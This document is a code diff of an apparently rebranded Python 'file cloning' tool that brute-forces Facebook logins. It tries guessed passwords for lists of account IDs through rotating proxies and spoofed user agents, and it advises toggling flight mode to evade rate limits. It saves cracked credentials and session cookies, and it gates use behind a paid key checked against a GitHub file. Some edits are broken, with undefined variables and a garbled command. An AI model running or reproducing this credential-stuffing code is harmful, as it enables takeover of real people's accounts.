@@ -1,3 +1,5 @@
+#tanjid_bai
+#bypss Tutul by TANJID VAI
 import os 
 #os.system("pkg install sox -y")
 #os.system("play op.mp3")
@@ -35,7 +37,7 @@ try:
 	open('.prox.txt','w').write(prox)
 	
 except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTARAK')
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -101,7 +103,7 @@ cokbrut=[]
 
 def back():
 	login()
-TARAK="TARAK"
+Tutul="Tutul"
 imt="SETU"
 ak="CLASS3-"
 
@@ -138,7 +140,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
 def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def TARAKj(u):
+def TUTULj(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 def clear():
 	os.system('clear')
@@ -148,46 +150,60 @@ def back():
 	import getpass
 
 attemps = 0
+
+#while attemps < 12345677901:
+#    username = input(' \033[0;92mEnter Username: ')
+  #  password = input(' \033[0;93mEnter Password: ')
+
+ #   if username == 'Asif' and password == 'Sakhani':
+    #    print(' \033[0;92mYou Have Successfully Logged in.')
+    #    break
+  #  else:
+     #   print(' Incorrect Pass Please Trying ')
+      #  attemps += 1
+       # continue
 os.system('clear')
 #------------------[ MAIN ]-----------------#
 
-os.system('espeak -a 300 " Asif Sakhani"')
-NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m Asif Sakhani\033[1;91m:\33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  TARAK,  King,  Tools"')
-os.system('xdg-open https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL')
+os.system('espeak -a 300 " Your,   Real,  Name,"')
+NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
+os.system('espeak -a 300 " Welcome,   to,  Asif,  Sakhani,  Tools"')
+os.system('xdg-opengit clone https://www.facebook.com/profile.php?id=100063307807505&mibextid=ZbWKwL')
 def banner():
 	os.system("clear")
 	print (f"""
-\033[1;97m88888888888 888b    888 88888888888 
-\033[1;97m    888     8888b   888     888     
-  \033[1;97m  888     88888b  888     888     
-    \033[1;97m888     888Y88b 888     888     
-    \033[1;97m888     888 Y88b888     888     
-\033[1;97m    888     888  Y88888     888     
-    \033[1;97m888     888   Y8888     888     
-  \033[1;97m  888     888    Y888     888\033[31;1m      XD
-\033[1;37m--------------------------------------------------
-[~] Author   : Asif Sakhani 
-[~] Facebook : MR DEVIL 
-[~] Github   : Asifsakhani3366
-[~] Version  : 3.2
-[~] Whatsapp : 03417020930
-[~] Tool     : Paid
-\033[1;37m--------------------------------------------------""")
+\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ██ \033[0;92m     ║
+║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
+║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
+║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██   \033[0;92m   ║
+║\033[0;91m    ██ \033[0;92m    ██████\033[0;91m     ██ \033[0;92m     ██████\033[0;91m  ███████\033[0;92m ║
+\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
+╠══[Author                   • \33[1;38mASIF-SAKHANI ]\33[1;38m     ║\033[1;31m 
+╠══[Facebook                 • MR DEVIL]   ║  \033[1;97m  
+╠══[Github                   • \33[1;38mASIF ]   ║\33[1;34m   
+╠══[Whatsapp                 • 03417020930 ]  ║\33[1;35m 
+╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
+╠══[VERSION                  • 11.6 ]          ║\033[1;35m 
+\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 def login():
 	banner()
-	ASIFj('\033[1;97m[1] File Cloning\n\033[1;97m[2] Contact With Admin\n\033[1;97m[0] \033[1;97mEXIT ')
-	Asifj('\033[0;97m===============================================')
-	Asif= input('\033[1;97m[+] CHOOSE: ');time.sleep(0.01)
-	if ASIF in ['m']:
+	TUTULj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
+	TUTULj('\033[0;97m===============================================')
+	TUTUL= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
+	if TUTUL in ['m']:
 		public()
-	elif ASIF in ['1']:
+	elif TUTUL in ['1']:
 		crack_file()
-	elif ASIF in ['i','0i']:
+	elif TUTUL in ['i','0i']:
 		result()
-	elif ASIF in ['2','02']:
-		os.system('xdg-open https://wa.me/+8801608843956')
-	elif ASIF in ['0']:
+	elif TUTUL in ['2','02']:
+		os.system('xdg-open https://wa.me/+923417020930')
+	elif TUTUL in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('#DONE LOGOUT ')
@@ -351,8 +367,8 @@ def crack_file():
 	os.system('clear')
 	banner()
 	os.system('espeak -a 300 " your file name"')
-	print('\033[1;97m   [ Put File Example:  /sdcard/king.txt  Etc...]')
-	o = input('\033[1;97m [+] INPut FILE NAME : ')
+	print('\033[1;32m[ Put File Example:  /sdcard/king.txt  Etc...]')
+	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
 	print('')
 	try:lin = open(o).read().splitlines()
 	except:
@@ -385,7 +401,7 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\033[1;97mLOGIN SEXY\n\x1b[1;97m [1] METHOD Sex ')
+	print('\x1b[1;92m LOGIN SEXY\n\x1b[1;97m [1] METHOD Sex ')
 	os.system('espeak -a 300 " 1,  method,  Sex"')
 	hc = input(' CHOOSE: ')
 	if hc in ['1','01']:
@@ -400,11 +416,11 @@ def setting():
 def passwrd():
 	os.system('clear')
 	banner()
-	print(f"\033[1;97m  [+] USER NAME\033[1;91m :\033[1;96m "+NameX)
-	print('\033[1;97m  [+] TOTAL IDz :\033[0;97m '+str(len(id)))
-	print("\033[1;97m  [+] Cloning Speed Super Fast")
-	print("\033[1;97m  [+] TURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	TARAKj(f'\033[0;97m===============================================')
+	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;92m ASIF-SAKHANI\033[1;91m :\033[1;96m "+XD)
+	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
+	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
+	TUTULj(f'\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -449,15 +465,15 @@ def passwrd():
 					
 				pool.submit(crack,idf,pwv)
 	print('')
-	ASIFj('==========================================')
-	ASIFj('CLONING COMPLETE .......... ')
+	TUTULj('==========================================')
+	TUTULj('CLONING COMPLETE .......... ')
 	print(f'{h}[{h}💚{h}]{h} Your Total OK idz : {h}%s '%(ok))
 	input('CLICK ENTER TO EXIT ')
 		
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[TARAK-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[Tutul-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -474,8 +490,8 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				#Asfif-Sakhani
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•TARAK-Cp] {idf} • {pw}')     
+				#Tutul-King
+				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Asif-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
 			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -485,17 +501,44 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#Asif-Sakhani
-				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•TARAK-Ok🖤] {idf} • {pw}\n\033[0;93m[🖤]= COOKIES •\x1b[1;91m{kuki} ')
-				print('\x1b[1;91m==============================================================')
-				os.system('espeak -a 300 " ASIF,  Ok,  id"')
-				open(' /sdcard/ASIF-OK.txt','a').write(idf+'|'+pw+'\n')
+				#Tutul-King
+				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Asif-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+				print('\033[0;94m==============================================================')
+				os.system('espeak -a 300 " Asif,  Ok,  id"')
+				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
 				cek_apk(session,coki)
 				break
+				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.system('touch prox.txt')
+	except:pass
 
+def Subscraption():
+	key1=open('/storage/emulated/0/android8.txt', 'r').read()
+	r1=requests.get("https://github.com/Rahullslam/Rahulslam.Paid/blob/main/Approval.txt").text
+	if key1 in r1:
+		os.system('clear')
+		login()
+	else:
+		os.system("clear")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m FREE USER NOT COME INBOX")
+		time.sleep(0.0010)
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Tutul King, ToOLs Daily Update")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Tutul+key1)
+		name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
+		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
+		time.sleep(3.5)
+		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Tutul+''+key1
+		os.system('am start https://wa.me/+923417020930?text=' + tks)
+		Subscraption() 
+Subscraption() 
 login()
